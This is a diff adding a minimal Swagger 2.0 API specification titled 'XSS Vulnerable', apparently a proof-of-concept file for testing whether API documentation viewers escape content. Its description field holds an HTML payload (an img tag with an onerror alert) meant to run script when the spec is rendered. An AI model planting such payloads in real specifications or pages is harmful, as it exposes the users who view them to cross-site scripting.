@@ -1,0 +1,13 @@
+####By Amit Kumar
+
+swagger: '2.0'
+info:
+  version: "0.0.1"
+  title: XSS Vulnerable
+  description: <img src=x onerror="alert('superhedgy 2025')">
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
